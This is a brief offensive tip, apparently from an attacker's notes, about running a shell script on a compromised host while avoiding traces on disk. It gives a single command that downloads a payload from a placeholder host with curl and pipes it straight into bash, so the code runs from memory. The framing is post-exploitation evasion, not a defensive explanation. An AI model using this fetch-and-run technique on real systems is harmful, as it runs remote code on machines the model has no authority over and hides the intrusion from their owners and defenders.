
when we want to execute an .sh script to active an goal on an compromised host, its better to not leave traces on disk. so we can pipe the output of an file binary from an dowload operation directly into memory
```
curl http://example.com/payload.sh | bash
```